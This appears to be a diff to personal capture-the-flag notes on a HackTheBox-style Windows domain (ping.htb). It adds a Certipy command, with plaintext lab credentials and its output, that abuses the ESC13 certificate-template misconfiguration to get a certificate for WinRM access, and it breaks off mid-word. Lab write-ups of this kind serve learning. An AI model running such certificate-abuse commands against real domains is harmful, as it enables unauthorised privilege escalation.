@@ -303,3 +303,19 @@ Certificate Templates
 
 Looks like i can grant winrm access through ESC13
 
+https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked
+
+```python
+❯❯❯ faketime -f +8h certipy-ad req -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 10.129.245.56 -u c.roberts -p 'AssumedBreach123' -k -ca 'ping-DC1-CA' -template 'TemporaryWinRM'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 18
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'C.Roberts@ping.htb'
+[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
+[*] Saving certificate and private key to 'c.roberts.pfx'
+[*] Wrote certificate and private key to 'c.roberts.pfx'
+```
+
+Ill 
